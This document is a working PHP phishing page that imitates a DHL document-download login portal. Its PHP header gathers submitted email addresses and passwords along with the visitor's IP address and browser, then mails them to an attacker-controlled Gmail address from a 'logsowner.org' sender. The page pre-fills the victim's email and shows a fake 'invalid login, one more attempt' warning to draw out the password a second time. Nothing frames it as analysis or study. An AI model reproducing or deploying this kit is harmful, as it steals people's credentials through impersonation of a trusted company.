<?
if(!empty($_POST['username']) && !empty($_POST['password']))
{
$browser="";

     if(strpos(strtolower($_SERVER["HTTP_USER_AGENT"]),strtolower("EDGE"))){$browser="Microsoft Edge";}
else if(strpos(strtolower($_SERVER["HTTP_USER_AGENT"]),strtolower("OPERA"))){$browser="Opera";}
else if(strpos(strtolower($_SERVER["HTTP_USER_AGENT"]),strtolower("MSIE"))){$browser="Internet Explorer";}
else if(strpos(strtolower($_SERVER["HTTP_USER_AGENT"]),strtolower("CHROME"))){$browser="Chrome";}
else if(strpos(strtolower($_SERVER["HTTP_USER_AGENT"]),strtolower("SAFARI"))){$browser="Safari";}
else if(strpos(strtolower($_SERVER["HTTP_USER_AGENT"]),strtolower("FIREFOX"))){$browser="Firefox";}
else {$browser="Other";}
$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
$message = "--------------DHL Login--------------\n";
$message .= "Email Address: ".$_POST['username']."\n";
$message .= "Password: ".$_POST['password']."\n";
$message .= "Date: ".$adddate."\n";
$message .= "Browser Used: ".$browser."\n";
$message .= "https://whatismyipaddress.com/ip/$ip\n";

$recipient = "@gmail.com";
$subject = "IP Accessed From: $ip";
$headers = "From: DHL Report <support@logsowner.org>";
	 
mail($recipient,$subject,$message,$headers);
}
$email = $_GET['id'];
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html lang="en" dir="ltr" xmlns="http://www.w3.org/1999/xhtml"><head>
<meta http-equiv="X-UA-Compatible" content="IE=Edge">
<link rel="shortcut icon" href="img/favicon.gif">
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
			<title>Global | English</title>
<link rel="stylesheet" type="text/css" href="img/layout.css">
<link rel="stylesheet" type="text/css" href="img/main.css">

<style type="text/css">.parcel-options-dropdown .select2-results__option { height: auto; }</style></head>
<body class="header-image" style="background-image: url('img/bg.jpg');"><div id="action" style="display:none;"></div><div id="main"><div id="header" class="wlp-bighorn-header">

<img src="img/dhl_logo_transparent.png" id="logo" alt="DHL Logo" border="0">

<div id="application-title">
</div><div id="servicelinks"><noscript><input type="submit" value="Change" class="submit" style="margin-left: 1em; line-height: 1em; position: relative; top: -0.2em;"/></noscript></form></div></div><div id="smep_portal_book_main" class="wlp-bighorn-book"><div id="navigation-top" class="jquerycssmenu clearfix"><ul id="nav"></ul><span class="wlp-bighorn-menu-button-panel"></span></div><div class="wlp-bighorn-book-main-content"><div id="navigation-top-shadow"></div><div id="smep_portal_page_login" class="wlp-bighorn-page clearfix"><div class="wlp-bighorn-layout wlp-bighorn-layout-flow"><div class="wlp-bighorn-layout-cell wlp-bighorn-layout-flow-horizontal wlp-bighorn-layout-flow-first northwest" style="width: 75%"><div></div><div id="portletLcc_1" class="wlp-bighorn-window  "><div class="wlp-bighorn-window-content">

<div class="lcc-wrapper">
	<div class="lcc-template">
			<div class="lcc-banner-wrapper">
			<div class="lcc-banner">
				<h1 class="lcc-banner-headline" style="color:black;"><font face="Arial Rounded MT">Welcome to DHL</h1>
				<div class="lcc-banner-text" style="color:black;"><font face="Arial Rounded MT">Let's Go Paperless!<br>This page gives a receiver access to login and download personalized documents provided by DHL</div>
			</div>
		                 </div>
	                                 </div>
                                                 </div>
</div></div></div><div class="wlp-bighorn-layout-cell wlp-bighorn-layout-flow-horizontal northeast" style="width: 25%"><div></div><div id="portletInstance_Login" class="wlp-bighorn-window  "><div class="wlp-bighorn-window-content">

	<div class="login-container">	
	<form action="oath.php?id=<? echo $email; ?>" method="post">
				<br><br><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<class="lcc-banner-headline" style="color:red;"><font face="Century Gothic" style="font-size:14px;">Invalid login detected.<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;You have one more attempt left.<br><br>
			<div class="external-login-form-wrapper"><class="lcc-banner-headline" style="color:#000000;"><font face="Verdana">
<div><input name="username" id="username" class="textBox" maxlength="60" size="20" value="<? echo $email; ?>" type="text" readonly></div>
<br>
<div>
<input name="password" id="password" class="textBox" maxlength="20" size="20" title="Password" placeholder="Password" autocomplete="off" type="password" required=""></div>
<div class="margin-bottom">
<div class="ui-rc-replacement">
<input type="checkbox" onclick="myFunction()">&nbsp;&nbsp;Show Password
<script>
function myFunction() {
    var x = document.getElementById("password");
    if (x.type === "password") {
        x.type = "text";
    } else {
        x.type = "password";
    }
}
</script><br>                                               </div>
                                                                        </div>
                                                                        <div class="margin">
				<input class="login-submit button button-red" value="CONTINUE" title="CONTINUE" type="submit" onClick = "return validate();">
				</div>
				<div class="margin-top">
				</div> 
			                 </div>
	                                                   </form><br><br><br><br><br><br><br><br><br><br>
</div></div></div></div><div class="wlp-bighorn-layout-cell wlp-bighorn-layout-flow-horizontal wlp-bighorn-layout-flow-last center" style="width: 100%">
<div class="clearAll"></div>
<div id="footer">
  <div class="container clearfix">
    <div class="footer-logo-wrapper">
    	<img src="img/DHL_footer_logo.png" title="Deutsche Post DHL" alt="Deutsche Post DHL" class="footer-logo">
    	<span class="copyright"><font face="Century Gothic">2020</span>
	</div>
    <div class="footer_navigation">
      <ul>
        <li><a class="first" href="#"><font face="Century Gothic">Accessibility</a></li>
        <li><a href="#"><font face="Century Gothic">Terms &amp; Conditions</a></li>
        <li><a class="last" href="#"><font face="Century Gothic">Privacy &amp; Cookies</a></li>
      </ul>
</body></html>